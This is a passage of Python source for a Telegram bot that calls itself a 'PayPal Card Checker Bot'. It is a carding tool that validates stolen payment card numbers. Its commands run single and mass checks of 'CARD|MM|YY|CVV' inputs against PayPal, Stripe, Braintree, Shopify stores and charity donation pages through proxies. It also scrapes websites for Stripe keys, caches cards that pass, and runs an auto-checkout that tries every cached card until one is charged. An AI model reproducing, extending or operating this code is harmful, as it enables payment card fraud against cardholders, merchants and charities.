    amount=0.00,  # Auth only
    timeout=30
)


# Phase 11.3: Refactored paypal_auth_command to use factory
paypal_auth_command = create_single_gateway_handler(
    gateway_fn=paypal_auth_check,
    gateway_name="PayPal Auth $0",
    amount=0.00,  # Auth only
    timeout=30
)


# Phase 11.3: Refactored braintree_charge_command to use factory
braintree_charge_command = create_single_gateway_handler(
    gateway_fn=braintree_charge_check,
    gateway_name="Braintree Charge",
    amount=1.00,
    timeout=30
)


# Phase 11.3: Refactored bellalliance_charge_command to use factory
bellalliance_charge_command = create_single_gateway_handler(
    gateway_fn=bellalliance_charge_check,
    gateway_name="Bell Alliance $5",
    amount=5.00,
    timeout=30
)


# Phase 11.4: Converted to Phase 11.3 batch factory
mass_corrigan_command = create_batch_gateway_handler(corrigan_check, 'Corrigan $0.50', 0.50, 500)
mass_texas_command = create_batch_gateway_handler(texas_check, 'Texas $0.50', 0.50, 500)
mass_paypal_command = create_batch_gateway_handler(paypal_charge_check, 'PayPal $5', 5.00, 500)
mass_shopify_checkout_command = create_batch_gateway_handler(shopify_checkout_check, 'Shopify Checkout', 1.00, 500)
mass_auto_detect_command = create_batch_gateway_handler(auto_detect_check, 'Auto-Detect', 1.00, 500)


categorize_sites_command = create_categorize_sites_handler(detect_platform=detect_platform)


# ============= PHASE 1 NEW GATEWAY COMMANDS =============

# Phase 11.4: Converted to Phase 11.3 batch factory
mass_stripe_epicalarc_command = create_batch_gateway_handler(stripe_auth_epicalarc_check, 'Stripe Epicalarc', 0.00, 500)
mass_stripe_real_auth_command = create_batch_gateway_handler(stripe_auth_epicalarc_check, 'Stripe Real Auth $0', 0.00, 500)
mass_paypal_auth_command = create_batch_gateway_handler(paypal_auth_check, 'PayPal Auth $0', 0.00, 500)
mass_braintree_charge_command = create_batch_gateway_handler(braintree_charge_check, 'Braintree Charge', 1.00, 500)




async def mass_shopify_nano_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass_shopify_nano command"""
    await mass_with_gateway(update, context, gateway_fn=lambda n, m, y, c, proxy=None: shopify_nano_check(n, m, y, c, shopify_check_from_file(), proxy), gateway_name='Shopify Nano')


import_shopify_stores_command = create_import_shopify_stores_handler(
    add_stores_bulk_async=add_stores_bulk_async
)


async def scan_shopify_stores_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scan pending stores to find products - /scanstores [limit]"""
    from tools.shopify_scraper import scan_stores_batch
    from tools.shopify_db import get_stores_to_scan, count_stores
    
    if not update.message:
        return
    
    limit = 50
    if context.args:
        try:
            limit = min(int(context.args[0]), 200)
        except:
            pass
    
    stores = get_stores_to_scan(limit=limit)
    if not stores:
        stats = count_stores()
        await update.message.reply_text(
            f"No stores to scan!\n\n"
            f"Total: {stats['total']}\n"
            f"Ready: {stats['ready']}\n"
            f"Pending: {stats['pending']}\n"
            f"Error: {stats['error']}"
        )
        return
    
    await update.message.reply_text(f"Scanning {len(stores)} stores for products...")
    
    async def progress(current, total):
        if current % 20 == 0:
            await update.message.reply_text(f"Progress: {current}/{total}")
    
    store_urls = [s['url'] for s in stores]
    result = await scan_stores_batch(store_urls, max_price=50.0, concurrency=10, progress_callback=progress)
    
    await update.message.reply_text(
        f"Scan Complete\n\n"
        f"Success: {result['success']}\n"
        f"Failed: {result['failed']}\n\n"
        f"Run /storestats to see database status"
    )


async def store_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show Shopify store database statistics - /storestats"""
    from tools.shopify_scraper import get_stores_summary
    
    if not update.message:
        return
    
    stats = get_stores_summary()
    
    await update.message.reply_text(
        f"Shopify Store Database\n\n"
        f"Total Stores: {stats.get('total', 0)}\n"
        f"Ready (with products): {stats.get('ready', 0)}\n"
        f"Pending: {stats.get('pending', 0)}\n"
        f"Error: {stats.get('error', 0)}\n\n"
        f"Total Products: {stats.get('total_products', 0)}\n"
        f"Avg Price: ${stats.get('avg_price', 0):.2f}\n"
        f"Min Price: ${stats.get('min_price', 0):.2f}"
    )


import_stripe_sites_command = create_import_stripe_sites_handler(
    add_stripe_sites_bulk=add_stripe_sites_bulk,
    count_stripe_sites=count_stripe_sites
)


async def scan_stripe_sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scan sites for Stripe keys - /scanstripe [limit]"""
    from tools.stripe_scraper import scan_site_for_stripe
    from tools.stripe_db import get_stripe_sites_to_scan, update_stripe_site, count_stripe_sites
    
    if not update.message:
        return
    
    limit = 100
    if context.args:
        try:
            limit = min(int(context.args[0]), 500)
        except:
            pass
    
    sites = get_stripe_sites_to_scan(limit=limit)
    if not sites:
        stats = count_stripe_sites()
        await update.message.reply_text(
            f"No sites to scan!\n\n"
            f"Total: {stats['total']}\n"
            f"Ready (with keys): {stats['ready']}\n"
            f"Pending: {stats['pending']}"
        )
        return
    
    msg = await update.message.reply_text(f"Scanning {len(sites)} sites for Stripe keys...")
    
    found = 0
    failed = 0
    
    for i, site in enumerate(sites):
        try:
            result = await asyncio.to_thread(scan_site_for_stripe, site['url'])
            
            if result['has_stripe'] and result['key_valid']:
                status = 'ready'
                found += 1
            elif result['has_stripe']:
                status = 'stripe_found'
            else:
                status = 'no_stripe'
                failed += 1
            
            await asyncio.to_thread(
                update_stripe_site,
                site['domain'],
                result.get('pk_key'),
                result.get('key_valid', False),
                status,
                result.get('message')
            )
        except Exception as e:
            await asyncio.to_thread(
                update_stripe_site,
                site['domain'],
                None,
                False,
                'error',
                str(e)[:100]
            )
            failed += 1
        
        if (i + 1) % 50 == 0:
            try:
                await msg.edit_text(f"Scanning... {i+1}/{len(sites)} (Found: {found})")
            except:
                pass
    
    stats = count_stripe_sites()
    await msg.edit_text(
        f"Stripe Scan Complete\n\n"
        f"Found valid keys: {found}\n"
        f"No Stripe: {failed}\n\n"
        f"Database Status:\n"
        f"Ready: {stats['ready']}\n"
        f"Pending: {stats['pending']}"
    )


stripe_stats_command = create_stripe_stats_handler(
    count_stripe_sites=count_stripe_sites,
    get_valid_stripe_keys=get_valid_stripe_keys
)


shopify_health_command = create_shopify_health_handler(
    get_next_shopify_site=get_next_shopify_site,
    advanced_shopify_health=advanced_shopify_health,
    mark_store_working=mark_store_working,
    mark_store_failure=mark_store_failure
)


# Phase 11.3: Refactored braintree_api_command to use factory
braintree_api_command = create_single_gateway_handler(
    gateway_fn=braintree_auth_api_check,
    gateway_name="Braintree API",
    amount=0.00,  # Auth only
    timeout=30
)


# Phase 11.3: Refactored mass_braintree_api_command to use batch factory
mass_braintree_api_command = create_batch_gateway_handler(
    gateway_fn=braintree_auth_api_check,
    gateway_name="Braintree API",
    amount=0.00,  # Auth only
    max_batch=500
)


shopify_auto_command = create_shopify_auto_handler(
    shopify_auto_check=shopify_auto_check,
    format_and_cache_response=format_and_cache_response,
    lookup_bin_info=lookup_bin_info,
    detect_security_type=detect_security_type,
    get_proxy_status_emoji=get_proxy_status_emoji,
    approval_status_class=ApprovalStatus,
    proxy=PROXY
)


addstore_command = create_addstore_handler(add_store=add_store)


async def delstore_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /delstore command - Remove a store from the database"""
    if not context.args:
        await update.message.reply_text(
            "<b>Delete Shopify Store</b>\n\n"
            "Usage: <code>/delstore ID</code> or <code>/delstore domain</code>\n\n"
            "Use /stores to see the list of stores.",
            parse_mode='HTML'
        )
        return
    
    identifier = context.args[0]
    success, message = await asyncio.to_thread(remove_store, identifier)
    
    if success:
        await update.message.reply_text(f"Removed: {message}", parse_mode='HTML')
    else:
        await update.message.reply_text(f"Error: {message}", parse_mode='HTML')


async def stores_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stores command - List all stores"""
    processing = await update.message.reply_text("Loading stores...")
    
    stores = await asyncio.to_thread(list_stores)
    stats = await asyncio.to_thread(count_stores)
    
    if not stores:
        await processing.edit_text(
            "<b>SHOPIFY STORES</b>\n\n"
            "No stores added yet.\n\n"
            "Use <code>/addstore URL</code> to add stores.",
            parse_mode='HTML'
        )
        return
    
    lines = []
    for store in stores[:20]:
        status_emoji = "✅" if store["status"] == "ready" else ("⏳" if store["status"] == "pending" else "❌")
        scan_time = store["last_scan"].strftime("%m/%d %H:%M") if store["last_scan"] else "Never"
        lines.append(f"{status_emoji} <b>{store['id']}</b>. {store['domain']} - {store['products']} products [{scan_time}]")
    
    msg = f"""<b>SHOPIFY STORES</b>

{chr(10).join(lines)}

<b>Stats:</b> {stats['ready']} ready, {stats['pending']} pending, {stats['error']} errors
<b>Total:</b> {stats['total']} stores

<code>/addstore URL</code> - Add store
<code>/delstore ID</code> - Remove store
<code>/scanstores</code> - Discover products"""
    
    await processing.edit_text(msg, parse_mode='HTML')


scanstores_command = create_scanstores_handler(
    count_stores=count_stores,
    scan_all_pending_stores=scan_all_pending_stores,
    background_store_tasks=background_store_tasks,
    proxy=PROXY
)


async def stopstores_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stopstores command - Cancel ongoing background store operation"""
    user_id = update.message.from_user.id
    
    if user_id not in background_store_tasks or background_store_tasks[user_id]["task"].done():
        await update.message.reply_text("No background store operation running.", parse_mode='HTML')
        return
    
    task_info = background_store_tasks[user_id]
    task_info["task"].cancel()
    
    try:
        await task_info["task"]
    except asyncio.CancelledError:
        pass
    
    del background_store_tasks[user_id]
    await update.message.reply_text(f"Cancelled {task_info['type']} operation.", parse_mode='HTML')


async def liststores_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /liststores command - List all stores with full product details (no truncation)"""
    processing = await update.message.reply_text("Loading full store list...")
    
    stores = await asyncio.to_thread(list_stores_full)
    stats = await asyncio.to_thread(count_stores)
    
    if not stores:
        await processing.edit_text(
            "<b>SHOPIFY STORES</b>\n\n"
            "No stores added yet.\n\n"
            "Use <code>/addstore URL</code> to add stores.",
            parse_mode='HTML'
        )
        return
    
    messages = []
    current_msg = "<b>SHOPIFY STORES - FULL LIST</b>\n\n"
    
    for store in stores:
        status_emoji = "✅" if store["status"] == "ready" else ("⏳" if store["status"] == "pending" else "❌")
        scan_time = store["last_scan"].strftime("%m/%d %H:%M") if store["last_scan"] else "Never"
        
        store_text = f"{status_emoji} <b>{store['id']}. {store['domain']}</b>\n"
        store_text += f"   Status: {store['status']} | Products: {store['product_count']}\n"
        store_text += f"   Currency: {store['currency']} | Country: {store['country'] or 'N/A'}\n"
        store_text += f"   Last Scan: {scan_time}\n"
        
        if store['cheapest_product']:
            p = store['cheapest_product']
            store_text += f"   <b>Selected Product:</b>\n"
            store_text += f"   {p['title'][:60]}{'...' if len(p.get('title', '')) > 60 else ''}\n"
            store_text += f"   Price: {p['price']} {p['currency']} | Variant: {p['variant_id']}\n"
        
        store_text += "\n"
        
        if len(current_msg) + len(store_text) > 3800:
            messages.append(current_msg)
            current_msg = store_text
        else:
            current_msg += store_text
    
    current_msg += f"\n<b>Stats:</b> {stats['ready']} ready, {stats['pending']} pending, {stats['error']} errors\n"
    current_msg += f"<b>Total:</b> {stats['total']} stores"
    messages.append(current_msg)
    
    await processing.edit_text(messages[0], parse_mode='HTML')
    
    for msg in messages[1:]:
        await update.message.reply_text(msg, parse_mode='HTML')
        await asyncio.sleep(0.5)


addstores_command = create_addstores_handler(
    add_stores_bulk=add_stores_bulk,
    add_stores_bulk_async=add_stores_bulk_async,
    background_store_tasks=background_store_tasks,
    uploaded_files=uploaded_files
)


handle_store_file = create_handle_store_file(add_stores_bulk=add_stores_bulk)


async def sho_fast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /shof command - Fast Shopify check using cached stores"""
    if not context.args:
        await update.message.reply_text(
            "<b>Fast Shopify Gate</b>\n\n"
            "Usage: <code>/shof CARD|MM|YY|CVV</code>\n\n"
            "Uses a random cached store for faster checkout.\n"
            "Add stores with /addstore first.",
            parse_mode='HTML'
        )
        return
    
    card_input = context.args[0]
    parts = card_input.split('|')
    if len(parts) != 4:
        await update.message.reply_text("Invalid format! Use CARD|MM|YY|CVV", parse_mode='HTML')
        return
    
    card_num = parts[0].strip()
    card_mon = parts[1].strip()
    card_yer = parts[2].strip()
    card_cvc = parts[3].strip()
    
    store = await asyncio.to_thread(get_random_store_with_product)
    
    if not store:
        await update.message.reply_text("No cached stores available. Use /addstore and /scanstores first.", parse_mode='HTML')
        return
    
    cached_product = store.get("cheapest_product")
    cached_token = store.get("storefront_token")
    
    processing = await update.message.reply_text(f"Checking on {store['domain']} (cached)...\n{get_proxy_status_emoji()}")
    
    result, proxy_ok = await shopify_auto_check(
        store['url'], card_num, card_mon, card_yer, card_cvc, 
        proxy=PROXY,
        cached_product=cached_product,
        cached_token=cached_token
    )
    
    status = ApprovalStatus.DECLINED
    if result:
        if "charged" in result.lower():
            status = ApprovalStatus.APPROVED
        elif "ccn live" in result.lower() or "cvv" in result.lower() or "insufficient" in result.lower():
            status = ApprovalStatus.CVV_ISSUE
        elif "approved" in result.lower():
            status = ApprovalStatus.APPROVED
    
    bank_name, country = lookup_bin_info(card_num)
    formatted_response = await format_and_cache_response(
        gateway_name=f"Shopify Fast ({store['domain']})",
        card_input=card_input,
        status=status,
        message=result,
        elapsed_sec=1.0,
        security_type=detect_security_type(result),
        vbv_status="Unknown",
        proxy_alive=proxy_ok == "Yes",
        bank_name=bank_name,
        country=country
    )
    await processing.edit_text(formatted_response, parse_mode='HTML')




async def autoco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /autoco command - Auto Checkout with cached cards"""
    if not context.args:
        stats = await asyncio.to_thread(count_cached_cards)
        await update.message.reply_text(
            f"<b>Auto Checkout</b>\n\n"
            f"Tries all cached cards against a Stripe store.\n\n"
            f"<b>Usage:</b>\n"
            f"<code>/autoco https://store.com</code>\n\n"
            f"<b>Cached Cards:</b> {stats['active']} active\n\n"
            f"<b>Manage Cards:</b>\n"
            f"/cards - List cached cards\n"
            f"/addcard - Manually add a card\n"
            f"/delcard - Remove a card",
            parse_mode='HTML'
        )
        return
    
    store_url = context.args[0].strip()
    if not store_url.startswith("http"):
        store_url = f"https://{store_url}"
    
    cards = await asyncio.to_thread(get_all_cached_cards, "active")
    
    if not cards:
        await update.message.reply_text(
            "No cached cards available.\n\n"
            "Cards are cached automatically when approved, or use:\n"
            "<code>/addcard CARD|MM|YY|CVV</code>",
            parse_mode='HTML'
        )
        return
    
    processing = await update.message.reply_text(
        f"<b>Auto Checkout</b>\n\n"
        f"Store: {store_url}\n"
        f"Cards: {len(cards)}\n\n"
        f"Extracting Stripe key...",
        parse_mode='HTML'
    )
    
    last_update = [0]
    
    async def progress_callback(current, total, result):
        if current - last_update[0] >= 3 or current == total or result.get("charged"):
            last_update[0] = current
            status_emoji = "✅" if result.get("charged") else ("🔶" if result.get("approved") else "❌")
            try:
                await processing.edit_text(
                    f"<b>Auto Checkout</b>\n\n"
                    f"Progress: {current}/{total}\n\n"
                    f"Last: {result.get('card_masked', 'N/A')}\n"
                    f"Status: {status_emoji} {result.get('message', 'N/A')[:50]}",
                    parse_mode='HTML'
                )
            except:
                pass
    
    proxy = PROXY if PROXY else None
    
    async def do_checkout():
        return await auto_checkout_all_cards(
            store_url=store_url,
            cards=cards,
            proxy=proxy,
            progress_callback=progress_callback,
            stop_on_success=True
        )
    
    context.application.create_task(run_autoco_task(processing, store_url, do_checkout))


async def run_autoco_task(processing, store_url, do_checkout):
    """Background task for auto checkout"""
    try:
        result = await do_checkout()
        
        if result.get("error"):
            await processing.edit_text(
                f"<b>Auto Checkout Failed</b>\n\n"
                f"Store: {store_url}\n"
                f"Error: {result['error']}",
                parse_mode='HTML'
            )
            return
        
        if result["charged"] > 0:
            charged = result["charged_cards"][0]
            await processing.edit_text(
                f"<b>✅ CHECKOUT SUCCESS</b>\n\n"
                f"Store: {store_url}\n"
                f"Cards tried: {result['cards_tried']}\n\n"
                f"<b>CHARGED CARD:</b>\n"
                f"<code>{charged['card']}</code>\n\n"
                f"Bank: {charged.get('bank', 'N/A')}",
                parse_mode='HTML'
            )
        elif result["approved"] > 0:
            await processing.edit_text(
                f"<b>🔶 Cards Valid But Not Charged</b>\n\n"
                f"Store: {store_url}\n"
                f"Cards tried: {result['cards_tried']}\n"
                f"Approved: {result['approved']}\n\n"
                f"Cards may require 3DS or higher amount.",
                parse_mode='HTML'
            )
        else:
            await processing.edit_text(
                f"<b>❌ No Cards Worked</b>\n\n"
                f"Store: {store_url}\n"
                f"Cards tried: {result['cards_tried']}\n"
                f"All cards declined.",
                parse_mode='HTML'
            )
    except Exception as e:
        await processing.edit_text(
            f"<b>Auto Checkout Error</b>\n\n"
            f"Store: {store_url}\n"
            f"Error: {str(e)[:100]}",
            parse_mode='HTML'
        )


async def cards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cards command - List cached cards"""
    cards = await asyncio.to_thread(get_all_cached_cards, "active")
    
    if not cards:
        await update.message.reply_text(
            "<b>Cached Cards</b>\n\n"
            "No cards cached.\n\n"
            "Cards are cached automatically when approved.\n"
            "Or add manually: <code>/addcard CARD|MM|YY|CVV</code>",
            parse_mode='HTML'
        )
        return
    
    lines = ["<b>Cached Cards</b>\n"]
    for i, card in enumerate(cards[:20], 1):
        bank = card.get("bank", "Unknown")[:20] if card.get("bank") else "Unknown"
        lines.append(f"{i}. <code>{card['card_masked']}</code> - {bank} (x{card['times_used']})")
    
    if len(cards) > 20:
        lines.append(f"\n... and {len(cards) - 20} more")
    
    lines.append(f"\n<b>Total:</b> {len(cards)} cards")
    lines.append("\nUse <code>/delcard ID</code> to remove")
    
    await update.message.reply_text("\n".join(lines), parse_mode='HTML')


async def addcard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addcard command - Manually cache a card"""
    if not context.args:
        await update.message.reply_text(
            "<b>Add Card to Cache</b>\n\n"
            "Usage: <code>/addcard CARD|MM|YY|CVV</code>\n\n"
            "Cards are also cached automatically when approved.",
            parse_mode='HTML'
        )
        return
    
    card_input = context.args[0].strip()
    parts = card_input.split("|")
    if len(parts) != 4:
        await update.message.reply_text("Invalid format! Use CARD|MM|YY|CVV", parse_mode='HTML')
        return
    
    card_num, card_mon, card_yer, card_cvv = parts[0], parts[1], parts[2], parts[3]
    
    if not card_num.isdigit() or len(card_num) < 13:
        await update.message.reply_text("Invalid card number!", parse_mode='HTML')
        return
    
    bank_name, country = lookup_bin_info(card_num)
    
    success, msg, card_id = await asyncio.to_thread(
        cache_card, card_num, card_mon, card_yer, card_cvv,
        "manual", None, bank_name, None, country
    )
    
    if success:
        await update.message.reply_text(
            f"<b>Card Cached</b>\n\n"
            f"Card: <code>{card_num[:6]}****{card_num[-4:]}</code>\n"
            f"Bank: {bank_name or 'Unknown'}\n"
            f"Country: {country or 'Unknown'}",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(f"Failed to cache card: {msg}", parse_mode='HTML')


async def delcard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /delcard command - Remove a cached card"""
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/delcard ID</code> or <code>/delcard last4</code>",
            parse_mode='HTML'
        )
        return
    
    identifier = context.args[0].strip()
    success, msg = await asyncio.to_thread(remove_cached_card, identifier)
    
    if success:
        await update.message.reply_text(f"✅ {msg}", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ {msg}", parse_mode='HTML')


# ============================================================================
# CONCURRENT BATCH QUEUE COMMANDS
# ============================================================================

async def queue_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /queue command - Show queued documents and active processing sessions"""
    user_id = update.message.from_user.id
    
    queued_docs = get_queued_documents(user_id)
    active_sessions = get_active_doc_sessions(user_id)
    
    lines = ["<b>📁 Document Queue Status</b>\n"]
    
    if queued_docs:
        lines.append(f"<b>Queued ({len(queued_docs)}):</b>")
        for i, doc in enumerate(queued_docs, 1):
            lines.append(f"  {i}. <code>{doc['filename']}</code>")
    else:
        lines.append("No documents queued.")
    
    lines.append("")
    
    if active_sessions:
        lines.append(f"<b>Processing ({len(active_sessions)}):</b>")
        for session in active_sessions:
            progress = f"{session.get('processed', 0)}/{session.get('total', 0)}"
            approved = session.get('approved', 0)
            lines.append(f"  • <code>{session.get('filename', 'Unknown')}</code> - {progress} (✅{approved})")
    else:
        lines.append("No active processing sessions.")
    
    lines.append("\n<b>Commands:</b>")
    lines.append("<code>/massall</code> - Process all queued docs")
    lines.append("<code>/clearqueue</code> - Clear queue")
    lines.append("<code>/stopall</code> - Stop all processing")
    
    await update.message.reply_text("\n".join(lines), parse_mode='HTML')


async def massall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /massall command - Process all queued documents concurrently"""
    from gates.paypal_charge import paypal_charge_check
    from gates.braintree_auth import braintree_auth_check as bt_check
    
    gate_name = "PayPal"
    gate_func = paypal_charge_check
    
    if context.args:
        gate_arg = context.args[0].lower()
        gate_mapping = {
            'paypal': ('PayPal', paypal_charge_check),
            'pp': ('PayPal', paypal_charge_check),
            'corrigan': ('Corrigan $0.50', corrigan_check),
            'cf': ('Corrigan $0.50', corrigan_check),
            'texas': ('Texas $0.50', texas_check),
            'tsa': ('Texas $0.50', texas_check),
            'braintree': ('Braintree Auth', bt_check),
            'bt': ('Braintree Auth', bt_check),
        }
        if gate_arg in gate_mapping:
            gate_name, gate_func = gate_mapping[gate_arg]
    
    await start_concurrent_batch_processing(update, context, gate_name, gate_func)


async def clearqueue_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearqueue command - Clear all queued documents"""
    user_id = update.message.from_user.id
    
    queued_count = len(get_queued_documents(user_id))
    clear_document_queue(user_id)
    
    await update.message.reply_text(
        f"✅ Cleared {queued_count} document(s) from queue.",
        parse_mode='HTML'
    )


async def stopall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stopall command - Stop all concurrent processing sessions"""
    user_id = update.message.from_user.id
    
    stopped_count = 0
    for session_id, session in concurrent_doc_sessions.items():
        if session.get("user_id") == user_id and not session.get("completed", False):
            session["stopped"] = True
            stopped_count += 1
    
    if stopped_count > 0:
        await update.message.reply_text(
            f"⏹️ Stopping {stopped_count} concurrent processing session(s)...",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            "❌ No active processing sessions to stop.",
            parse_mode='HTML'
        )


def main():
    """Main function to run the bot"""
    print(f"{F}[*] Starting PayPal Card Checker Bot...{RESET}")
    
    # Register signal handlers for graceful shutdown
    register_signal_handlers(ongoing_checks, stop_requested, uploaded_files)
    
    # Initialize database
    print(f"{F}[*] Initializing database...{RESET}")
    if init_db():
        print(f"{F}[✓] Database initialized{RESET}")
    else:
        print(f"{Z}[!] Database not configured (stores will not be cached){RESET}")
    
    # Initialize proxy pool
    init_proxy_pool()
    
    # Check proxy on startup
    print(f"{F}[*] Checking proxy status...{RESET}")
    check_proxy()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers - ORDER MATTERS! Document handler must come BEFORE text handler
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(CommandHandler("proxy", proxy_command))
    application.add_handler(CommandHandler("setproxy", setproxy_command))
    application.add_handler(CommandHandler("sp", setproxy_command))
    application.add_handler(CommandHandler("metrics", metrics_command))
    
    # Multi-gateway parallel check
    application.add_handler(CommandHandler("allauth", allauth_command))
    application.add_handler(CommandHandler("aa", allauth_command))
    application.add_handler(CommandHandler("allcharge", allcharge_command))
    application.add_handler(CommandHandler("ac", allcharge_command))
    application.add_handler(CommandHandler("mass", mass_check_command))
    application.add_handler(CommandHandler("stripe", stripe_command))
    application.add_handler(CommandHandler("mass_stripe", mass_stripe_command))
    application.add_handler(CommandHandler("madystripe", madystripe_command))
    application.add_handler(CommandHandler("mass_madystripe", mass_madystripe_command))
    application.add_handler(CommandHandler("checkout", checkout_command))
    application.add_handler(CommandHandler("amex", amex_command))
    # Phase 1 New Gateway Handlers
    application.add_handler(CommandHandler("stripe_epicalarc", stripe_epicalarc_command))
    application.add_handler(CommandHandler("mass_stripe_epicalarc", mass_stripe_epicalarc_command))
    application.add_handler(CommandHandler("shopify_nano", shopify_nano_command))
    application.add_handler(CommandHandler("mass_shopify_nano", mass_shopify_nano_command))
    application.add_handler(CommandHandler("shopify_health", shopify_health_command))
    application.add_handler(CommandHandler("importstores", import_shopify_stores_command))
    application.add_handler(CommandHandler("scanstores", scan_shopify_stores_command))
    application.add_handler(CommandHandler("storestats", store_stats_command))
    application.add_handler(CommandHandler("importstripe", import_stripe_sites_command))
    application.add_handler(CommandHandler("scanstripe", scan_stripe_sites_command))
    application.add_handler(CommandHandler("stripestats", stripe_stats_command))
    application.add_handler(CommandHandler("braintree_api", braintree_api_command))
    application.add_handler(CommandHandler("mass_braintree_api", mass_braintree_api_command))
    application.add_handler(CommandHandler("sho", shopify_auto_command))
    application.add_handler(CommandHandler("shof", sho_fast_command))
    application.add_handler(CommandHandler("gen", gen_command))
    application.add_handler(CommandHandler("fake", fake_command))
    application.add_handler(CommandHandler("extrap", extrap_command))
    application.add_handler(CommandHandler("stopextrap", stopextrap_command))
    application.add_handler(CommandHandler("cg", chatgpt_command))  # /cg → ChatGPT
    application.add_handler(CommandHandler("bb", blackbox_command))  # /bb → Blackbox AI
    application.add_handler(CommandHandler("addstore", addstore_command))
    application.add_handler(CommandHandler("delstore", delstore_command))
    application.add_handler(CommandHandler("stores", stores_command))
    application.add_handler(CommandHandler("scanstores", scanstores_command))
    application.add_handler(CommandHandler("addstores", addstores_command))
    application.add_handler(CommandHandler("liststores", liststores_command))
    application.add_handler(CommandHandler("stopstores", stopstores_command))
    application.add_handler(CommandHandler("autoco", autoco_command))
    application.add_handler(CommandHandler("cards", cards_command))
    application.add_handler(CommandHandler("addcard", addcard_command))
    application.add_handler(CommandHandler("delcard", delcard_command))
    # NEW: Real Charge/Auth Gates
    application.add_handler(CommandHandler("stripecharge", stripecharge_command))
    application.add_handler(CommandHandler("mass_stripecharge", mass_stripecharge_command))
    application.add_handler(CommandHandler("braintreeauth", braintreeauth_command))
    application.add_handler(CommandHandler("mass_braintreeauth", mass_braintreeauth_command))
    application.add_handler(CommandHandler("checkoutauth", checkoutauth_command))
    
    # Merchant Gateway Handlers
    application.add_handler(CommandHandler("blemart", blemart_command))
    application.add_handler(CommandHandler("mass_blemart", mass_blemart_command))
    application.add_handler(CommandHandler("districtpeople", districtpeople_command))
    application.add_handler(CommandHandler("mass_districtpeople", mass_districtpeople_command))
    application.add_handler(CommandHandler("bgddesigns", bgddesigns_command))
    application.add_handler(CommandHandler("mass_bgddesigns", mass_bgddesigns_command))
    application.add_handler(CommandHandler("saintvinson", saintvinson_givewp_command))
    application.add_handler(CommandHandler("mass_saintvinson", mass_saintvinson_givewp_command))
    application.add_handler(CommandHandler("staleks", staleks_florida_command))
    
    application.add_handler(CommandHandler("mass_staleks", mass_staleks_florida_command))
    application.add_handler(CommandHandler("ccfoundation", ccfoundation_command))
    application.add_handler(CommandHandler("mass_ccfoundation", mass_ccfoundation_command))
    
    
    # NEW: Multi-gateway concurrent checking
    application.add_handler(CommandHandler("multigate", multigate_command))
    
    # SHORT ALIAS COMMANDS (Single checks)
    application.add_handler(CommandHandler("s", stripe_command))    # /s → /stripe
    application.add_handler(CommandHandler("se", stripe_epicalarc_command))  # /se → /stripe_epicalarc
    application.add_handler(CommandHandler("c1", charge1_command))  # /c1 → /charge1
    application.add_handler(CommandHandler("c2", charge2_command))  # /c2 → /charge2
    application.add_handler(CommandHandler("c3", charge3_command))  # /c3 → /charge3
    application.add_handler(CommandHandler("c4", charge4_command))  # /c4 → /charge4
    application.add_handler(CommandHandler("c5", charge5_command))  # /c5 → /charge5
    application.add_handler(CommandHandler("ms", madystripe_command))  # /ms → /madystripe
    application.add_handler(CommandHandler("sc2", stripe_charity_command))  # /sc2 → /stripe_charity
    application.add_handler(CommandHandler("stripe_charity", stripe_charity_command))
    application.add_handler(CommandHandler("msc2", mass_stripe_charity_command))  # /msc2 → /mass_stripe_charity
    application.add_handler(CommandHandler("mass_stripe_charity", mass_stripe_charity_command))
    application.add_handler(CommandHandler("co", checkout_command))  # /co → /checkout
    application.add_handler(CommandHandler("sc", stripecharge_command))  # /sc → /stripecharge
    application.add_handler(CommandHandler("ba", bellalliance_charge_command))  # /ba → Bell Alliance $5 CAD
    application.add_handler(CommandHandler("bta", braintreeauth_command))  # /bta → /braintreeauth
    application.add_handler(CommandHandler("epi", stripe_epicalarc_command))  # /epi → /stripe_epicalarc
    application.add_handler(CommandHandler("b3", braintree_laguna_command))  # /b3 → /braintree_laguna
    application.add_handler(CommandHandler("braintree_laguna", braintree_laguna_command))
    application.add_handler(CommandHandler("mb3", mass_braintree_laguna_command))  # /mb3 → /mass_braintree_laguna
    application.add_handler(CommandHandler("lions", lions_club_command))  # /lions → Lions Club $5
    application.add_handler(CommandHandler("lc5", lions_club_command))  # /lc5 → Lions Club $5
    application.add_handler(CommandHandler("mlions", mass_lions_club_command))  # /mlions → mass Lions Club
    
    # Stripe Verified AUTH Gates (dynamic PK extraction)
    application.add_handler(CommandHandler("sa1", foe_auth_command))  # /sa1 → Auth $0
    application.add_handler(CommandHandler("msa1", mass_foe_auth_command))  # /msa1 → mass Auth $0
    application.add_handler(CommandHandler("sa2", charitywater_auth_command))  # /sa2 → Auth $0
    application.add_handler(CommandHandler("msa2", mass_charitywater_auth_command))  # /msa2 → mass Auth $0
    application.add_handler(CommandHandler("sa3", donorschoose_auth_command))  # /sa3 → Auth $0
    application.add_handler(CommandHandler("msa3", mass_donorschoose_auth_command))  # /msa3 → mass Auth $0
    application.add_handler(CommandHandler("sa4", newschools_auth_command))  # /sa4 → Auth $0
